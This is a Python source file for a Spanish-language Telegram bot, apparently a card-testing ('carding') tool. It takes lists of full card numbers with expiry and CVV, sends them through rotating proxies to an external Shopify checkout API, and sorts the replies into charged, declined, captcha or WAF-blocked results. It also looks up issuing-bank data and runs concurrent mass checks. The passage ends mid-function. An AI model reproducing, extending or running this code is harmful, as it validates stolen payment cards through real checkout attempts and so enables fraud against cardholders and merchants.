# -*- coding: utf-8 -*-
"""
Bot de Telegram para verificar tarjetas - VERSIÓN CON BARRA DE PROGRESO EN TIEMPO REAL
Mass check con actualizaciones cada 0.5s, botón STOP, y diseño profesional.
"""

import os
import json
import logging
import asyncio
import time
import random
import sqlite3
import re
from collections import deque, defaultdict
from typing import Dict, List, Tuple, Optional, Any
from datetime import datetime, timedelta
from contextlib import asynccontextmanager
import math
from dataclasses import dataclass, field
from enum import Enum
import statistics
import signal
import sys

from telegram import Update, Document, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
import aiohttp

# ================== MANEJO DE SEÑALES ==================
def handle_shutdown(signum, frame):
    logger.info(f"🛑 Recibida señal {signum}, cerrando gracefulmente...")
    sys.exit(0)

signal.signal(signal.SIGTERM, handle_shutdown)
signal.signal(signal.SIGINT, handle_shutdown)

# ================== CONFIGURACIÓN ==================
TOKEN = os.environ.get("BOT_TOKEN")
if not TOKEN:
    raise ValueError("❌ ERROR: BOT_TOKEN no está configurado")

API_ENDPOINTS = [
    os.environ.get("API_URL", "https://auto-shopify-api-production.up.railway.app/index.php"),
]

DB_FILE = os.environ.get("DB_FILE", "bot_database.db")
MAX_WORKERS_PER_USER = int(os.environ.get("MAX_WORKERS", 8))
RATE_LIMIT_SECONDS = int(os.environ.get("RATE_LIMIT", 2))
DAILY_LIMIT_CHECKS = int(os.environ.get("DAILY_LIMIT", 1000))
MASS_LIMIT_PER_HOUR = int(os.environ.get("MASS_LIMIT", 3))
MASS_COOLDOWN_MINUTES = int(os.environ.get("MASS_COOLDOWN", 3))
ADMIN_IDS = [int(id) for id in os.environ.get("ADMIN_IDS", "").split(",") if id]

# Configuración de timeouts
TIMEOUT_CONFIG = {
    "connect": 3,
    "sock_read": 5,
    "total": 8,
}

# Configuración de confianza
CONFIDENCE_CONFIG = {
    "charged_fast_threshold": 1.5,
    "charged_normal_min": 2.0,
    "charged_normal_max": 7.0,
    "html_large_threshold": 50000,
}

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

INSTANCE_ID = os.environ.get("RAILWAY_DEPLOYMENT_ID", str(time.time()))

# ================== ENUMS ==================
class CheckStatus(Enum):
    CHARGED = "charged"
    DECLINED = "declined"
    INSUFFICIENT_FUNDS = "insufficient_funds"
    CARD_ERROR = "card_error"
    RATE_LIMIT = "rate_limit"
    BLOCKED = "blocked"
    WAF_BLOCK = "waf_block"
    SITE_DOWN = "site_down"
    THREE_DS = "3ds"
    CAPTCHA = "captcha"
    CONNECT_TIMEOUT = "connect_timeout"
    READ_TIMEOUT = "read_timeout"
    POSSIBLE_APPROVAL = "possible_approval"
    AMBIGUOUS = "ambiguous"
    UNKNOWN = "unknown"

class Confidence(Enum):
    HIGH = "HIGH"
    MEDIUM = "MEDIUM"
    LOW = "LOW"
    SUSPICIOUS = "SUSPICIOUS"
    CONFIRMED = "CONFIRMED"

# ================== CLASIFICADOR DE RESPUESTAS ==================
class ResponseThinker:
    SUCCESS_PATTERNS = {
        "thank_you": re.compile(r'thank\s*you', re.I),
        "order_confirmed": re.compile(r'order\s*confirmed', re.I),
        "receipt": re.compile(r'receipt', re.I),
        "payment_accepted": re.compile(r'payment\s*accepted', re.I),
        "transaction_approved": re.compile(r'transaction\s*approved', re.I),
        "complete": re.compile(r'(checkout|purchase)\s*complete', re.I),
    }
    
    DECLINE_PATTERNS = {
        "insufficient_funds": re.compile(r'insufficient\s*funds', re.I),
        "card_error": re.compile(r'card\s*error', re.I),
        "do_not_honor": re.compile(r'do\s*not\s*honor', re.I),
        "declined": re.compile(r'declined', re.I),
        "rejected": re.compile(r'rejected', re.I),
        "invalid_card": re.compile(r'invalid\s*card', re.I),
    }
    
    BLOCK_PATTERNS = {
        "rate_limit": re.compile(r'rate\s*limit|too\s*many\s*requests|429', re.I),
        "blocked": re.compile(r'blocked|forbidden|access\s*denied|403', re.I),
        "waf": re.compile(r'waf|firewall|security\s*check', re.I),
        "captcha": re.compile(r'captcha|recaptcha|challenge|robot', re.I),
        "3ds": re.compile(r'3ds|3d\s*secure|verified\s*by\s*visa', re.I),
    }
    
    @classmethod
    def think(cls, context: 'CheckContext') -> 'CheckResult':
        patterns_detected = []
        
        html_size = context.response_size
        
        if html_size > CONFIDENCE_CONFIG["html_large_threshold"]:
            patterns_detected.append("large_html")
        
        if context.response_time < CONFIDENCE_CONFIG["charged_fast_threshold"]:
            patterns_detected.append("fast_response")
        elif CONFIDENCE_CONFIG["charged_normal_min"] <= context.response_time <= CONFIDENCE_CONFIG["charged_normal_max"]:
            patterns_detected.append("normal_response")
        else:
            patterns_detected.append("slow_response")
        
        if context.http_code:
            if context.http_code == 429:
                return cls._create_result(context, CheckStatus.RATE_LIMIT, Confidence.CONFIRMED, 
                                         "rate limit detected", patterns_detected + ["http_429"])
            elif context.http_code == 403:
                return cls._create_result(context, CheckStatus.BLOCKED, Confidence.CONFIRMED,
                                         "access forbidden", patterns_detected + ["http_403"])
            elif 500 <= context.http_code < 600:
                return cls._create_result(context, CheckStatus.SITE_DOWN, Confidence.HIGH,
                                         f"server error {context.http_code}", patterns_detected + [f"http_{context.http_code}"])
            elif context.http_code == 408:
                return cls._create_result(context, CheckStatus.READ_TIMEOUT, Confidence.HIGH,
                                         "request timeout", patterns_detected + ["http_408"])
        
        response_lower = context.response_text.lower()
        
        for block_type, pattern in cls.BLOCK_PATTERNS.items():
            if pattern.search(response_lower):
                patterns_detected.append(f"block:{block_type}")
                if block_type == "captcha":
                    return cls._create_result(context, CheckStatus.CAPTCHA, Confidence.HIGH,
                                             "captcha detected", patterns_detected)
                elif block_type == "3ds":
                    return cls._create_result(context, CheckStatus.THREE_DS, Confidence.HIGH,
                                             "3D Secure required", patterns_detected)
                elif block_type == "rate_limit":
                    return cls._create_result(context, CheckStatus.RATE_LIMIT, Confidence.CONFIRMED,
                                             "rate limited", patterns_detected)
                elif block_type == "waf":
                    return cls._create_result(context, CheckStatus.WAF_BLOCK, Confidence.HIGH,
                                             "WAF triggered", patterns_detected)
        
        for decline_type, pattern in cls.DECLINE_PATTERNS.items():
            if pattern.search(response_lower):
                patterns_detected.append(f"decline:{decline_type}")
                if decline_type == "insufficient_funds":
                    return cls._create_result(context, CheckStatus.INSUFFICIENT_FUNDS, Confidence.CONFIRMED,
                                             "payment rejected", patterns_detected)
                elif decline_type == "card_error":
                    return cls._create_result(context, CheckStatus.CARD_ERROR, Confidence.CONFIRMED,
                                             "card error", patterns_detected)
                else:
                    return cls._create_result(context, CheckStatus.DECLINED, Confidence.CONFIRMED,
                                             "payment rejected", patterns_detected)
        
        success_matches = []
        for success_type, pattern in cls.SUCCESS_PATTERNS.items():
            if pattern.search(response_lower):
                success_matches.append(success_type)
                patterns_detected.append(f"success:{success_type}")
        
        if success_matches:
            if context.response_time < CONFIDENCE_CONFIG["charged_fast_threshold"]:
                return cls._create_result(context, CheckStatus.POSSIBLE_APPROVAL, Confidence.SUSPICIOUS,
                                         "fast response with success patterns", patterns_detected)
            elif CONFIDENCE_CONFIG["charged_normal_min"] <= context.response_time <= CONFIDENCE_CONFIG["charged_normal_max"]:
                if html_size < CONFIDENCE_CONFIG["html_large_threshold"]:
                    return cls._create_result(context, CheckStatus.CHARGED, Confidence.HIGH,
                                             "confirmed checkout flow", patterns_detected)
                else:
                    return cls._create_result(context, CheckStatus.POSSIBLE_APPROVAL, Confidence.MEDIUM,
                                             "success patterns with large response", patterns_detected)
            else:
                return cls._create_result(context, CheckStatus.POSSIBLE_APPROVAL, Confidence.LOW,
                                         "slow success response", patterns_detected)
        
        if html_size > CONFIDENCE_CONFIG["html_large_threshold"]:
            return cls._create_result(context, CheckStatus.AMBIGUOUS, Confidence.LOW,
                                     "large HTML response, possible WAF page", patterns_detected)
        
        return cls._create_result(context, CheckStatus.UNKNOWN, Confidence.LOW,
                                 "unrecognized response pattern", patterns_detected)
    
    @classmethod
    def _create_result(cls, context, status, confidence, reason, patterns):
        from dataclasses import dataclass
        result = CheckResult(
            context=context,
            status=status,
            confidence=confidence,
            reason=reason,
            success=(status == CheckStatus.CHARGED),
            price=cls._extract_price(context.response_text),
            patterns_detected=patterns
        )
        return result
    
    @staticmethod
    def _extract_price(text: str) -> str:
        try:
            patterns = [
                r'\$?(\d+\.\d{2})',
                r'Price["\s:]+(\d+\.\d{2})',
                r'amount["\s:]+(\d+\.\d{2})',
            ]
            for pattern in patterns:
                match = re.search(pattern, text, re.I)
                if match:
                    return f"${match.group(1)}"
        except:
            pass
        return "N/A"

# ================== DATACLASSES ==================
@dataclass
class CheckContext:
    card_bin: str
    card_last4: str
    site: str
    proxy: str
    response_time: float
    http_code: Optional[int]
    response_text: str
    response_size: int
    redirect_count: int
    timestamp: datetime

@dataclass
class CheckResult:
    context: CheckContext
    status: CheckStatus
    confidence: Confidence
    reason: str
    success: bool
    price: str = "N/A"
    bin_info: Dict = field(default_factory=dict)
    patterns_detected: List[str] = field(default_factory=list)

# ================== FUNCIONES AUXILIARES ==================
def create_progress_bar(current: int, total: int, width: int = 20) -> str:
    """Crea una barra de progreso visual"""
    if total == 0:
        return "[" + "░" * width + "]"
    filled = int((current / total) * width)
    bar = "█" * filled + "░" * (width - filled)
    return f"[{bar}]"

def get_status_emoji(status: CheckStatus) -> str:
    emoji_map = {
        CheckStatus.CHARGED: "✅",
        CheckStatus.POSSIBLE_APPROVAL: "⚠️",
        CheckStatus.DECLINED: "❌",
        CheckStatus.INSUFFICIENT_FUNDS: "💸",
        CheckStatus.CARD_ERROR: "❌",
        CheckStatus.RATE_LIMIT: "⏳",
        CheckStatus.BLOCKED: "🚫",
        CheckStatus.WAF_BLOCK: "🤖",
        CheckStatus.SITE_DOWN: "🌐",
        CheckStatus.THREE_DS: "🔒",
        CheckStatus.CAPTCHA: "🤖",
        CheckStatus.CONNECT_TIMEOUT: "⏱️",
        CheckStatus.READ_TIMEOUT: "⏱️",
        CheckStatus.AMBIGUOUS: "❓",
        CheckStatus.UNKNOWN: "❓",
    }
    return emoji_map.get(status, "❓")

def format_time(seconds: float) -> str:
    """Formatea tiempo en minutos y segundos"""
    minutes = int(seconds // 60)
    secs = int(seconds % 60)
    if minutes > 0:
        return f"{minutes}m {secs}s"
    return f"{secs}s"

async def get_bin_info(bin_code: str) -> Dict:
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://lookup.binlist.net/{bin_code}", timeout=5) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    return {
                        "bank": data.get("bank", {}).get("name", "Unknown"),
                        "brand": data.get("scheme", "Unknown").upper(),
                        "country": data.get("country", {}).get("alpha2", "UN"),
                        "type": data.get("type", "Unknown"),
                    }
    except:
        pass
    return {"bank": "Unknown", "brand": "UNKNOWN", "country": "UN", "type": "Unknown"}

# ================== VALIDACIÓN DE TARJETAS ==================
class CardValidator:
    @staticmethod
    def luhn_check(card_number: str) -> bool:
        def digits_of(n):
            return [int(d) for d in str(n)]
        digits = digits_of(card_number)
        odd_digits = digits[-1::-2]
        even_digits = digits[-2::-2]
        checksum = sum(odd_digits)
        for d in even_digits:
            checksum += sum(digits_of(d * 2))
        return checksum % 10 == 0

    @staticmethod
    def validate_expiry(month: str, year: str) -> bool:
        try:
            exp_month = int(month)
            exp_year = int(year)
            if len(year) == 2:
                exp_year += 2000
            now = datetime.now()
            if exp_year < now.year:
                return False
            if exp_year == now.year and exp_month < now.month:
                return False
            return True
        except:
            return False

    @staticmethod
    def validate_cvv(cvv: str) -> bool:
        return cvv.isdigit() and len(cvv) in (3, 4)

    @staticmethod
    def parse_card(card_str: str) -> Optional[Dict]:
        parts = card_str.split('|')
        if len(parts) != 4:
            return None
        number, month, year, cvv = parts
        if not number.isdigit() or len(number) < 13 or len(number) > 19:
            return None
        if not CardValidator.luhn_check(number):
            return None
        if not CardValidator.validate_expiry(month, year):
            return None
        if not CardValidator.validate_cvv(cvv):
            return None
        return {
            "number": number,
            "month": month,
            "year": year,
            "cvv": cvv,
            "bin": number[:6],
            "last4": number[-4:]
        }

# ================== DETECCIÓN INTELIGENTE ==================
def detect_line_type(line: str) -> Tuple[str, Optional[str]]:
    line = line.strip()
    if not line:
        return None, None

    if line.startswith(('http://', 'https://')):
        return 'site', line

    if '|' in line:
        parts = line.split('|')
        if len(parts) == 4 and all(p.strip() for p in parts):
            return 'card', line

    if ':' in line:
        parts = line.split(':')
        if len(parts) in [2, 4] or (len(parts) == 3 and parts[2] == ''):
            return 'proxy', line

    return None, None

# ================== BASE DE DATOS ==================
class Database:
    def __init__(self, db_path=DB_FILE):
        self.db_path = db_path
        self._write_lock = asyncio.Lock()
        self._batch_queue = []
        self._batch_lock = asyncio.Lock()
        self._batch_task = None
        self._initialized = False
        
    def _init_db_sync(self):
        with sqlite3.connect(self.db_path) as conn:
            conn.execute("PRAGMA journal_mode=WAL")
            cursor = conn.cursor()
            
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS users (
                    user_id INTEGER PRIMARY KEY,
                    sites TEXT DEFAULT '[]',
                    proxies TEXT DEFAULT '[]',
                    cards TEXT DEFAULT '[]',
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS learning (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER,
                    site TEXT,
                    proxy TEXT,
                    bin TEXT,
                    attempts INTEGER DEFAULT 0,
                    successes INTEGER DEFAULT 0,
                    declines INTEGER DEFAULT 0,
                    timeouts INTEGER DEFAULT 0,
                    blocks INTEGER DEFAULT 0,
                    total_time REAL DEFAULT 0,
                    last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    UNIQUE(user_id, site, proxy, bin)
                )
            ''')
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_learning_user ON learning(user_id)')
            
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS results (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER,
                    card_bin TEXT,
                    card_last4 TEXT,
                    site TEXT,
                    proxy TEXT,
                    status TEXT,
                    confidence TEXT,
                    reason TEXT,
                    response_time REAL,
                    http_code INTEGER,
                    price TEXT,
                    bin_info TEXT,
                    patterns TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_results_user ON results(user_id)')
            
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS rate_limits (
                    user_id INTEGER PRIMARY KEY,
                    last_check TIMESTAMP,
                    checks_today INTEGER DEFAULT 0,
                    last_mass TIMESTAMP,
                    mass_count_hour INTEGER DEFAULT 0,
                    last_reset DATE DEFAULT CURRENT_DATE
                )
            ''')
            
            conn.commit()

    async def initialize(self):
        if self._initialized:
            return
        loop = asyncio.get_event_loop()
        await loop.run_in_executor(None, self._init_db_sync)
        self._batch_task = asyncio.create_task(self._batch_processor())
        self._initialized = True
        logger.info(f"✅ Base de datos inicializada [Instancia: {INSTANCE_ID}]")

    async def _batch_processor(self):
        while True:
            try:
                await asyncio.sleep(5)
                if self._batch_queue:
                    async with self._batch_lock:
                        batch = self._batch_queue.copy()
                        self._batch_queue.clear()
                    
                    async with self._write_lock:
                        await self._execute_batch(batch)
            except asyncio.CancelledError:
                break
            except Exception as e:
                logger.error(f"Error en batch processor: {e}")

    async def _execute_batch(self, batch: List[tuple]):
        try:
            loop = asyncio.get_event_loop()
            await loop.run_in_executor(None, self._sync_execute_batch, batch)
        except Exception as e:
            logger.error(f"Error en batch insert: {e}")

    def _sync_execute_batch(self, batch: List[tuple]):
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            cursor.executemany(
                """INSERT INTO results 
                   (user_id, card_bin, card_last4, site, proxy, status, confidence,
                    reason, response_time, http_code, price, bin_info, patterns)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                batch
            )
            conn.commit()

    async def save_result(self, user_id: int, result: CheckResult):
        patterns_json = json.dumps(result.patterns_detected)
        async with self._batch_lock:
            self._batch_queue.append((
                user_id, result.context.card_bin, result.context.card_last4,
                result.context.site, result.context.proxy, result.status.value,
                result.confidence.value, result.reason, result.context.response_time,
                result.context.http_code, result.price, json.dumps(result.bin_info),
                patterns_json
            ))

    async def update_learning(self, user_id: int, result: CheckResult):
        weight = 1.0
        if result.confidence in [Confidence.LOW, Confidence.SUSPICIOUS]:
            weight = 0.3
        elif result.confidence == Confidence.MEDIUM:
            weight = 0.7
        
        existing = await self.fetch_one(
            "SELECT * FROM learning WHERE user_id = ? AND site = ? AND proxy = ? AND bin = ?",
            (user_id, result.context.site, result.context.proxy, result.context.card_bin)
        )
        
        if existing:
            attempts = existing["attempts"] + 1
            successes = existing["successes"] + (weight if result.success else 0)
            declines = existing["declines"] + (weight if "decline" in result.status.value else 0)
            timeouts = existing["timeouts"] + (weight if "timeout" in result.status.value else 0)
            blocks = existing["blocks"] + (weight if result.status in [CheckStatus.BLOCKED, CheckStatus.WAF_BLOCK, CheckStatus.RATE_LIMIT] else 0)
            total_time = existing["total_time"] + result.context.response_time
            
            await self.db.execute(
                """UPDATE learning SET 
                   attempts = ?, successes = ?, declines = ?, timeouts = ?, blocks = ?,
                   total_time = ?, last_seen = CURRENT_TIMESTAMP
                   WHERE id = ?""",
                (attempts, successes, declines, timeouts, blocks, total_time, existing["id"])
            )
        else:
            await self.db.execute(
                """INSERT INTO learning 
                   (user_id, site, proxy, bin, attempts, successes, declines, timeouts, blocks, total_time)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                (user_id, result.context.site, result.context.proxy, result.context.card_bin, 1,
                 weight if result.success else 0,
                 weight if "decline" in result.status.value else 0,
                 weight if "timeout" in result.status.value else 0,
                 weight if result.status in [CheckStatus.BLOCKED, CheckStatus.WAF_BLOCK, CheckStatus.RATE_LIMIT] else 0,
                 result.context.response_time)
            )

    async def execute(self, query: str, params: tuple = ()):
        async with self._write_lock:
            loop = asyncio.get_event_loop()
            return await loop.run_in_executor(None, lambda: self._sync_execute(query, params))

    def _sync_execute(self, query: str, params: tuple):
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            cursor.execute(query, params)
            conn.commit()
            return cursor

    async def fetch_one(self, query: str, params: tuple = ()):
        loop = asyncio.get_event_loop()
        return await loop.run_in_executor(None, lambda: self._sync_fetch_one(query, params))

    def _sync_fetch_one(self, query: str, params: tuple):
        with sqlite3.connect(self.db_path) as conn:
            conn.row_factory = sqlite3.Row
            cursor = conn.cursor()
            cursor.execute(query, params)
            row = cursor.fetchone()
            return dict(row) if row else None

    async def fetch_all(self, query: str, params: tuple = ()):
        loop = asyncio.get_event_loop()
        return await loop.run_in_executor(None, lambda: self._sync_fetch_all(query, params))

    def _sync_fetch_all(self, query: str, params: tuple):
        with sqlite3.connect(self.db_path) as conn:
            conn.row_factory = sqlite3.Row
            cursor = conn.cursor()
            cursor.execute(query, params)
            return [dict(row) for row in cursor.fetchall()]

    async def cleanup_old_results(self, days: int = 7):
        await self.execute(
            "DELETE FROM results WHERE created_at < date('now', ?)",
            (f"-{days} days",)
        )

    async def shutdown(self):
        if self._batch_task:
            self._batch_task.cancel()
            try:
                await self._batch_task
            except asyncio.CancelledError:
                pass

# ================== PROXY HEALTH CHECKER ==================
class ProxyHealthChecker:
    def __init__(self, db: Database, user_id: int):
        self.db = db
        self.user_id = user_id
        self.test_url = "https://httpbin.org/ip"
        self.timeout = aiohttp.ClientTimeout(
            total=TIMEOUT_CONFIG["total"],
            connect=TIMEOUT_CONFIG["connect"],
            sock_read=TIMEOUT_CONFIG["sock_read"]
        )
        
    async def check_proxy(self, proxy: str) -> Dict:
        start_time = time.time()
        result = {
            "proxy": proxy,
            "alive": False,
            "response_time": 0,
            "error": None,
            "ip": None,
        }
        
        try:
            proxy_parts = proxy.split(':')
            if len(proxy_parts) == 4:
                proxy_url = f"http://{proxy_parts[2]}:{proxy_parts[3]}@{proxy_parts[0]}:{proxy_parts[1]}"
            else:
                proxy_url = f"http://{proxy_parts[0]}:{proxy_parts[1]}"
            
            async with aiohttp.ClientSession(timeout=self.timeout) as session:
                async with session.get(self.test_url, proxy=proxy_url) as resp:
                    if resp.status == 200:
                        elapsed = time.time() - start_time
                        if elapsed < 4:
                            result["alive"] = True
                            result["response_time"] = elapsed
                            try:
                                data = await resp.json()
                                result["ip"] = data.get("origin", "Unknown")
                            except:
                                pass
        except Exception as e:
            result["error"] = str(e)[:50]
        
        return result
    
    async def check_all_proxies(self, proxies: List[str], max_concurrent: int = 25) -> List[Dict]:
        semaphore = asyncio.Semaphore(max_concurrent)
        
        async def check_with_semaphore(proxy):
            async with semaphore:
                return await self.check_proxy(proxy)
        
        tasks = [check_with_semaphore(p) for p in proxies]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        final_results = []
        for i, res in enumerate(results):
            if isinstance(res, Exception):
                final_results.append({
                    "proxy": proxies[i],
                    "alive": False,
                    "response_time": 0,
                    "error": str(res),
                    "ip": None
                })
            else:
                final_results.append(res)
        
        return final_results

# ================== CHECKER ==================
class UltraFastChecker:
    def __init__(self):
        self.connector = None
        self.session_pool = deque(maxlen=30)
        self._initialized = False
        
    async def initialize(self):
        if self._initialized:
            return
        self.connector = aiohttp.TCPConnector(limit=200, ttl_dns_cache=300)
        await self._create_sessions()
        self._initialized = True
        logger.info(f"✅ Checker inicializado [Instancia: {INSTANCE_ID}]")

    async def _create_sessions(self):
        for _ in range(30):
            session = aiohttp.ClientSession(
                connector=self.connector,
                timeout=aiohttp.ClientTimeout(
                    total=TIMEOUT_CONFIG["total"],
                    connect=TIMEOUT_CONFIG["connect"],
                    sock_read=TIMEOUT_CONFIG["sock_read"]
                )
            )
            self.session_pool.append(session)

    async def get_session(self):
        if not self._initialized:
            await self.initialize()
        if not self.session_pool:
            return aiohttp.ClientSession(connector=self.connector)
        return self.session_pool.popleft()

    async def return_session(self, session):
        if not session.closed:
            self.session_pool.append(session)

    async def shutdown(self):
        self._initialized = False
        while self.session_pool:
            s = self.session_pool.popleft()
            try:
                await s.close()
            except:
                pass
        if self.connector:
            await self.connector.close()

    async def check_card(self, site: str, proxy: str, card_data: Dict) -> CheckResult:
        card_str = f"{card_data['number']}|{card_data['month']}|{card_data['year']}|{card_data['cvv']}"
        params = {"site": site, "cc": card_str, "proxy": proxy}
        
        session = await self.get_session()
        start_time = time.time()
        bin_info = await get_bin_info(card_data['bin'])
        redirect_count = 0
        
        try:
            async with session.get(API_ENDPOINTS[0], params=params) as resp:
                elapsed = time.time() - start_time
                response_text = await resp.text()
                response_size = len(response_text)
                
                if resp.history:
                    redirect_count = len(resp.history)
                
                context = CheckContext(
                    card_bin=card_data['bin'],
                    card_last4=card_data['last4'],
                    site=site,
                    proxy=proxy,
                    response_time=elapsed,
                    http_code=resp.status,
                    response_text=response_text,
                    response_size=response_size,
                    redirect_count=redirect_count,
                    timestamp=datetime.now()
                )
                
                result = ResponseThinker.think(context)
                result.bin_info = bin_info
                return result
                
        except asyncio.TimeoutError as e:
            elapsed = time.time() - start_time
            error_str = str(e).lower()
            
            if "connect" in error_str:
                status = CheckStatus.CONNECT_TIMEOUT
                reason = "proxy connection timeout"
            else:
                status = CheckStatus.READ_TIMEOUT
                reason = "site read timeout"
            
            context = CheckContext(
                card_bin=card_data['bin'],
                card_last4=card_data['last4'],
                site=site,
                proxy=proxy,
                response_time=elapsed,
                http_code=None,
                response_text="",
                response_size=0,
                redirect_count=0,
                timestamp=datetime.now()
            )
            
            return CheckResult(
                context=context,
                status=status,
                confidence=Confidence.CONFIRMED,
                reason=reason,
                success=False,
                bin_info=bin_info
            )
            
        except Exception as e:
            elapsed = time.time() - start_time
            context = CheckContext(
                card_bin=card_data['bin'],
                card_last4=card_data['last4'],
                site=site,
                proxy=proxy,
                response_time=elapsed,
                http_code=None,
                response_text=str(e),
                response_size=0,
                redirect_count=0,
                timestamp=datetime.now()
            )
            
            return CheckResult(
                context=context,
                status=CheckStatus.UNKNOWN,
                confidence=Confidence.LOW,
                reason=f"request error: {str(e)[:50]}",
                success=False,
                bin_info=bin_info
            )
        finally:
            await self.return_session(session)

# ================== USER MANAGER ==================
class UserManager:
    def __init__(self, db: Database):
        self.db = db
        self._rate_lock = asyncio.Lock()
        self._last_mass_time = defaultdict(lambda: 0)

    async def get_user_data(self, user_id: int) -> Dict:
        row = await self.db.fetch_one(
            "SELECT sites, proxies, cards FROM users WHERE user_id = ?",
            (user_id,)
        )
        
        if not row:
            await self.db.execute(
                "INSERT INTO users (user_id, sites, proxies, cards) VALUES (?, ?, ?, ?)",
                (user_id, '[]', '[]', '[]')
            )
            return {"sites": [], "proxies": [], "cards": []}
        
        return {
            "sites": json.loads(row["sites"]),
            "proxies": json.loads(row["proxies"]),
            "cards": json.loads(row["cards"])
        }

    async def update_user_data(self, user_id: int, sites=None, proxies=None, cards=None):
        current = await self.get_user_data(user_id)
        
        if sites is not None:
            current["sites"] = sites
        if proxies is not None:
            current["proxies"] = proxies
        if cards is not None:
            current["cards"] = cards
        
        await self.db.execute(
            "UPDATE users SET sites = ?, proxies = ?, cards = ? WHERE user_id = ?",
            (json.dumps(current["sites"]), json.dumps(current["proxies"]), 
             json.dumps(current["cards"]), user_id)
        )

    async def check_rate_limit(self, user_id: int, command: str) -> Tuple[bool, str]:
        async with self._rate_lock:
            today = datetime.now().date()
            
            row = await self.db.fetch_one(
                "SELECT * FROM rate_limits WHERE user_id = ?",
                (user_id,)
            )
            
            if not row:
                await self.db.execute(
                    """INSERT INTO rate_limits 
                       (user_id, last_check, checks_today, last_mass, mass_count_hour, last_reset)
                       VALUES (?, ?, ?, ?, ?, ?)""",
                    (user_id, datetime.now(), 0, None, 0, today)
                )
                return True, ""
            
            last_reset = datetime.fromisoformat(row["last_reset"]).date()
            if last_reset < today:
                await self.db.execute(
                    "UPDATE rate_limits SET checks_today = 0, mass_count_hour = 0, last_reset = ? WHERE user_id = ?",
                    (today, user_id)
                )
                checks_today = 0
                mass_count_hour = 0
            else:
                checks_today = row["checks_today"]
                mass_count_hour = row["mass_count_hour"]
            
            if command == "mass":
                if mass_count_hour >= MASS_LIMIT_PER_HOUR:
                    return False, f"⚠️ Máximo {MASS_LIMIT_PER_HOUR} mass/hora"
                
                if row.get("last_mass"):
                    last_mass = datetime.fromisoformat(row["last_mass"])
                    elapsed = (datetime.now() - last_mass).total_seconds() / 60
                    if elapsed < MASS_COOLDOWN_MINUTES:
                        wait = MASS_COOLDOWN_MINUTES - elapsed
                        return False, f"⏳ Espera {wait:.1f} minutos para otro mass"
            
            elif command == "check":
                if checks_today >= DAILY_LIMIT_CHECKS:
                    return False, f"📅 Límite diario ({DAILY_LIMIT_CHECKS}) alcanzado"
                
                if row.get("last_check"):
                    last_check = datetime.fromisoformat(row["last_check"])
                    elapsed = (datetime.now() - last_check).seconds
                    if elapsed < RATE_LIMIT_SECONDS:
                        wait = RATE_LIMIT_SECONDS - elapsed
                        return False, f"⏳ Espera {wait}s"
            
            return True, ""

    async def increment_checks(self, user_id: int, command: str):
        now = datetime.now()
        
        if command == "mass":
            await self.db.execute(
                """UPDATE rate_limits SET 
                   mass_count_hour = mass_count_hour + 1,
                   last_mass = ?
                   WHERE user_id = ?""",
                (now, user_id)
            )
        else:
            await self.db.execute(
                """UPDATE rate_limits SET 
                   checks_today = checks_today + 1,
                   last_check = ?
                   WHERE user_id = ?""",
                (now, user_id)
            )

    async def get_optimal_workers(self, user_id: int, proxies: List[str]) -> int:
        return min(len(proxies), 8)

    async def is_admin(self, user_id: int) -> bool:
        return user_id in ADMIN_IDS

# ================== CARD CHECK SERVICE ==================
class CardCheckService:
    def __init__(self, db: Database, user_manager: UserManager, checker: UltraFastChecker):
        self.db = db
        self.user_manager = user_manager
        self.checker = checker

    async def check_single(self, user_id: int, card_data: Dict, site: str, proxy: str) -> CheckResult:
        result = await self.checker.check_card(site, proxy, card_data)
        await self.db.save_result(user_id, result)
        await self.db.update_learning(user_id, result)
        return result

    async def check_mass(
        self, 
        user_id: int,
        cards: List[Dict],
        sites: List[str],
        proxies: List[str],
        progress_callback=None
    ) -> Tuple[List[CheckResult], int, float]:
        
        optimal_workers = await self.user_manager.get_optimal_workers(user_id, proxies)
        
        queue = asyncio.Queue()
        for card in cards:
            await queue.put(card)
        
        result_queue = asyncio.Queue()
        processed = 0
        approved = 0
        declined = 0
        timeout = 0
        start_time = time.time()
        last_update = time.time()
        
        proxy_cycle = deque(proxies)
        proxy_lock = asyncio.Lock()
        
        async def worker(worker_id: int):
            nonlocal processed, approved, declined, timeout
            
            while not queue.empty() and not cancel_mass.get(user_id, False):
                try:
                    card_data = await asyncio.wait_for(queue.get(), timeout=1.0)
                except asyncio.TimeoutError:
                    break
                
                async with proxy_lock:
                    proxy = proxy_cycle[0]
                    proxy_cycle.rotate(1)
                
                site = sites[0]
                
                result = await self.checker.check_card(site, proxy, card_data)
                
                await result_queue.put(result)
                
                # Actualizar contadores
                if result.success:
                    approved += 1
                elif "timeout" in result.status.value:
                    timeout += 1
                else:
                    declined += 1
                
                processed += 1
                
                # Actualizar progreso cada 0.5s o cada 5 tarjetas
                current_time = time.time()
                if progress_callback and (current_time - last_update >= 0.5 or processed % 5 == 0):
                    await progress_callback(processed, approved, declined, timeout, len(cards))
                    last_update = current_time
            
            return processed
        
        tasks = [asyncio.create_task(worker(i)) for i in range(optimal_workers)]
        
        results = []
        
        # Mantener actualizaciones incluso sin workers
        while len(results) < len(cards) and not all(t.done() for t in tasks):
            try:
